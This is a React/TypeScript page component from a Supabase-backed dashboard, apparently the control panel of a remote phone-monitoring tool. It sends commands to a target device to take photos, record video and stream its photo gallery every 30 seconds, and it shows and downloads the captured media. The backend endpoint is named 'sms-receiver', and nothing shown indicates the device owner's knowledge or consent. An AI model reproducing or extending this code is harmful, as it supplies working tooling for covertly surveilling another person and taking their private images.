import { useState, useEffect, useRef, useCallback } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { ArrowLeft, Camera, Image, Video, Trash2, Download, RefreshCw, Loader2, Play, Square } from "lucide-react";
import { Link, useParams } from "react-router-dom";
import { toast } from "sonner";
import { format } from "date-fns";

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
const EDGE_BASE = `${SUPABASE_URL}/functions/v1/sms-receiver`;

const DeviceMedia = () => {
  const { deviceId } = useParams<{ deviceId: string }>();
  const queryClient = useQueryClient();
  const [selectedMedia, setSelectedMedia] = useState<{ url: string; type: string } | null>(null);
  const [galleryStreaming, setGalleryStreaming] = useState(false);
  const galleryIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const sendGalleryCommand = useCallback(async () => {
    if (!deviceId) return;
    const row = {
      device_id: deviceId,
      command_type: "upload_gallery" as const,
      command_status: "pending" as const,
      command_data: {} as any,
    };
    await supabase.from("device_commands").insert(row);
    queryClient.invalidateQueries({ queryKey: ["device-commands", deviceId] });
  }, [deviceId, queryClient]);

  const startGalleryStream = useCallback(() => {
    setGalleryStreaming(true);
    sendGalleryCommand(); // send first one immediately
    galleryIntervalRef.current = setInterval(() => {
      sendGalleryCommand();
    }, 30000); // every 30 seconds
    toast.success("Gallery stream started — fetching photos every 30s");
  }, [sendGalleryCommand]);

  const stopGalleryStream = useCallback(async () => {
    setGalleryStreaming(false);
    if (galleryIntervalRef.current) {
      clearInterval(galleryIntervalRef.current);
      galleryIntervalRef.current = null;
    }
    // Cancel pending gallery commands
    if (deviceId) {
      await supabase
        .from("device_commands")
        .update({ command_status: "cancelled" } as any)
        .eq("device_id", deviceId)
        .eq("command_type", "upload_gallery")
        .eq("command_status", "pending");
      queryClient.invalidateQueries({ queryKey: ["device-commands", deviceId] });
    }
    toast.info("Gallery stream stopped");
  }, [deviceId, queryClient]);

  useEffect(() => {
    return () => {
      if (galleryIntervalRef.current) clearInterval(galleryIntervalRef.current);
    };
  }, []);

  const { data: device } = useQuery({
    queryKey: ["device-info", deviceId],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("devices")
        .select("*")
        .eq("id", deviceId!)
        .single();
      if (error) throw error;
      return data;
    },
    enabled: !!deviceId,
  });

  const { data: mediaList, isLoading: mediaLoading } = useQuery({
    queryKey: ["device-media", deviceId],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("device_media")
        .select("*")
        .eq("device_id", deviceId!)
        .order("created_at", { ascending: false });
      if (error) throw error;
      return data;
    },
    enabled: !!deviceId,
    refetchInterval: 5000,
  });

  const { data: pendingCommands } = useQuery({
    queryKey: ["device-commands", deviceId],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("device_commands")
        .select("*")
        .eq("device_id", deviceId!)
        .eq("command_status", "pending")
        .order("created_at", { ascending: false });
      if (error) throw error;
      return data;
    },
    enabled: !!deviceId,
    refetchInterval: 3000,
  });

  const sendCommand = useMutation({
    mutationFn: async ({ commandType, commandData }: { commandType: string; commandData?: Record<string, unknown> }) => {
      const row = {
        device_id: deviceId!,
        command_type: commandType,
        command_status: "pending" as const,
        command_data: (commandData || {}) as any,
      };
      const { error } = await supabase.from("device_commands").insert(row);
      if (error) throw error;
    },
    onSuccess: (_, { commandType }) => {
      queryClient.invalidateQueries({ queryKey: ["device-commands", deviceId] });
      toast.success(`Command "${commandType}" sent to device`);
    },
    onError: () => toast.error("Failed to send command"),
  });

  const deleteMutation = useMutation({
    mutationFn: async (media: { id: string; media_url: string }) => {
      await supabase.storage.from("device-media").remove([media.media_url]);
      const { error } = await supabase.from("device_media").delete().eq("id", media.id);
      if (error) throw error;
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["device-media", deviceId] });
      toast.success("Media deleted");
    },
  });

  const getSignedUrl = async (path: string): Promise<string> => {
    const res = await fetch(`${EDGE_BASE}/media-url?path=${encodeURIComponent(path)}`, {
      headers: { apikey: SUPABASE_KEY },
    });
    const json = await res.json();
    return json.url;
  };

  const viewMedia = async (path: string, mediaType: string) => {
    const url = await getSignedUrl(path);
    setSelectedMedia({ url, type: mediaType });
  };

  const downloadMedia = async (path: string, fileName: string) => {
    const url = await getSignedUrl(path);
    const a = document.createElement("a");
    a.href = url;
    a.download = fileName || "download";
    a.target = "_blank";
    a.click();
  };

  const hasPending = (type: string) =>
    pendingCommands?.some((c: any) => c.command_type === type) ?? false;

  return (
    <div className="min-h-screen bg-background">
      <header className="border-b border-border bg-card sticky top-0 z-10">
        <div className="max-w-5xl mx-auto px-4 py-4 flex items-center gap-3">
          <Link to="/devices">
            <Button variant="ghost" size="icon"><ArrowLeft className="w-4 h-4" /></Button>
          </Link>
          <div className="flex-1">
            <h1 className="text-lg font-bold text-foreground" style={{ fontFamily: "var(--font-display)" }}>
              Device Media — {device?.device_name || "Loading..."}
            </h1>
            <p className="text-xs text-muted-foreground font-mono">{device?.device_id}</p>
          </div>
        </div>
      </header>

      <div className="max-w-5xl mx-auto px-4 py-6 space-y-6">
        {/* Remote Controls */}
        <Card>
          <CardHeader>
            <CardTitle className="text-base">Remote Camera, Video & Gallery</CardTitle>
            <CardDescription>Send commands to the device to capture photos, record video clips, or upload gallery images</CardDescription>
          </CardHeader>
          <CardContent className="flex flex-wrap gap-3">
            <Button
              onClick={() => sendCommand.mutate({ commandType: "capture_photo" })}
              disabled={sendCommand.isPending || hasPending("capture_photo")}
            >
              {hasPending("capture_photo") ? (
                <><Loader2 className="w-4 h-4 mr-2 animate-spin" />Waiting for capture...</>
              ) : (
                <><Camera className="w-4 h-4 mr-2" />Capture Photo</>
              )}
            </Button>
            <Button
              variant="default"
              className="bg-red-600 hover:bg-red-700"
              onClick={() => sendCommand.mutate({ commandType: "record_video", commandData: { duration_sec: 10 } })}
              disabled={sendCommand.isPending || hasPending("record_video")}
            >
              {hasPending("record_video") ? (
                <><Loader2 className="w-4 h-4 mr-2 animate-spin" />Recording...</>
              ) : (
                <><Video className="w-4 h-4 mr-2" />Record Video (10s)</>
              )}
            </Button>
            {!galleryStreaming ? (
              <Button
                variant="secondary"
                onClick={startGalleryStream}
                disabled={sendCommand.isPending}
              >
                <Play className="w-4 h-4 mr-2" />Start Gallery Photos
              </Button>
            ) : (
              <Button
                variant="destructive"
                onClick={stopGalleryStream}
              >
                <Square className="w-4 h-4 mr-2" />Stop Gallery Photos
              </Button>
            )}
            <Button
              variant="outline"
              onClick={() => {
                queryClient.invalidateQueries({ queryKey: ["device-media", deviceId] });
                queryClient.invalidateQueries({ queryKey: ["device-commands", deviceId] });
              }}
            >
              <RefreshCw className="w-4 h-4 mr-2" />Refresh
            </Button>
          </CardContent>
        </Card>

        {/* Pending commands */}
        {pendingCommands && pendingCommands.length > 0 && (
          <Card className="border-yellow-500/30 bg-yellow-500/5">
            <CardContent className="py-3 flex items-center gap-2">
              <Loader2 className="w-4 h-4 animate-spin text-yellow-600" />
              <span className="text-sm text-yellow-700">
                {pendingCommands.length} pending command(s) — waiting for device to respond...
              </span>
            </CardContent>
          </Card>
        )}

        {/* Media Gallery */}
        <div>
          <h2 className="text-sm font-semibold text-foreground mb-3">
            Media ({mediaList?.length || 0} items)
          </h2>
          {mediaLoading ? (
            <p className="text-center py-12 text-muted-foreground">Loading...</p>
          ) : !mediaList?.length ? (
            <Card className="border-dashed border-2">
              <CardContent className="py-12 text-center text-muted-foreground">
                No media yet. Use the buttons above to capture photos, record videos, or request gallery uploads.
              </CardContent>
            </Card>
          ) : (
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
              {mediaList.map((m: any) => (
                <MediaCard
                  key={m.id}
                  media={m}
                  onView={() => viewMedia(m.media_url, m.media_type)}
                  onDownload={() => downloadMedia(m.media_url, m.file_name)}
                  onDelete={() => deleteMutation.mutate({ id: m.id, media_url: m.media_url })}
                />
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Full-screen media viewer */}
      {selectedMedia && (
        <div
          className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4"
          onClick={() => setSelectedMedia(null)}
        >
          {selectedMedia.type === "video" ? (
            <video
              src={selectedMedia.url}
              controls
              autoPlay
              className="max-w-full max-h-full rounded-lg"
              onClick={(e) => e.stopPropagation()}
            />
          ) : (
            <img
              src={selectedMedia.url}
              alt="Full view"
              className="max-w-full max-h-full object-contain rounded-lg"
              onClick={(e) => e.stopPropagation()}
            />
          )}
          <div className="absolute top-4 right-4 flex gap-2" onClick={(e) => e.stopPropagation()}>
            <a
              href={selectedMedia.url}
              download
              target="_blank"
              rel="noreferrer"
            >
              <Button variant="secondary" size="sm">
                <Download className="w-4 h-4 mr-1.5" />Download
              </Button>
            </a>
            <Button
              variant="ghost"
              size="icon"
              className="text-white hover:bg-white/20"
              onClick={() => setSelectedMedia(null)}
            >
              ✕
            </Button>
          </div>
        </div>
      )}
    </div>
  );
};

const MediaCard = ({
  media,
  onView,
  onDownload,
  onDelete,
}: {
  media: any;
  onView: () => void;
  onDownload: () => void;
  onDelete: () => void;
}) => {
  const [thumbUrl, setThumbUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const isVideo = media.media_type === "video";

  useState(() => {
    const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
    const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
    fetch(
      `${SUPABASE_URL}/functions/v1/sms-receiver/media-url?path=${encodeURIComponent(media.media_url)}`,
      { headers: { apikey: SUPABASE_KEY } }
    )
      .then((r) => r.json())
      .then((j) => { setThumbUrl(j.url); setLoading(false); })
      .catch(() => setLoading(false));
  });

  return (
    <Card className="overflow-hidden group">
      <div className="aspect-square bg-muted relative cursor-pointer" onClick={onView}>
        {loading ? (
          <div className="absolute inset-0 flex items-center justify-center">
            <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
          </div>
        ) : thumbUrl ? (
          isVideo ? (
            <div className="w-full h-full flex items-center justify-center bg-black/10 relative">
              <video src={thumbUrl} className="w-full h-full object-cover" muted preload="metadata" />
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="bg-black/60 rounded-full p-3">
                  <Video className="w-6 h-6 text-white" />
                </div>
              </div>
            </div>
          ) : (
            <img src={thumbUrl} alt={media.file_name} className="w-full h-full object-cover" />
          )
        ) : (
          <div className="absolute inset-0 flex items-center justify-center text-muted-foreground">
            {isVideo ? <Video className="w-8 h-8" /> : <Image className="w-8 h-8" />}
          </div>
        )}
        <Badge className="absolute top-2 left-2 text-[10px]" variant={
          media.media_type === "video" ? "destructive" :
          media.media_type === "gallery" ? "secondary" : "default"
        }>
          {media.media_type}
        </Badge>
      </div>
      <CardContent className="p-2">
        <p className="text-xs text-muted-foreground truncate">{media.file_name}</p>
        <p className="text-[10px] text-muted-foreground">
          {format(new Date(media.created_at), "MMM d, HH:mm")}
          {media.file_size ? ` · ${(media.file_size / 1024).toFixed(0)} KB` : ""}
        </p>
        <div className="flex gap-1 mt-1">
          <Button variant="outline" size="sm" className="h-6 text-xs px-2" onClick={onDownload}>
            <Download className="w-3 h-3 mr-1" />
            {isVideo ? "Save Video" : "Download"}
          </Button>
          <Button variant="ghost" size="icon" className="h-6 w-6 text-destructive" onClick={onDelete}>
            <Trash2 className="w-3 h-3" />
          </Button>
        </div>
      </CardContent>
    </Card>
  );
};

export default DeviceMedia;
